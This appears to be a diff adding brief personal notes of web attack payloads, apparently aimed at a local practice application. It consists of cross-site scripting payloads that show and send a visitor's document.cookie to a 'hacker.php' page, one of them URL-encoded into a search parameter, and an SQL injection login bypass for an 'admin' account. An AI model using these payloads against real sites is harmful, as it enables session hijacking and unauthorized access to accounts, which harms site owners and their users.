@@ -1,0 +1,11 @@
+<script>alert(document.cookie)</script>
+
+<script>window.location.assign("hacker.php?cookie="%2bdocument.cookie);</script>
+http://localhost/atw/book.php?search=%3Cscript%3Ewindow.location.assign(%22hacker.php?cookie=%22%2bdocument.cookie);%3C/script%3E
+
+SQL Injection
+
+login no pass
+
+username: admin
+password: ' or ''='
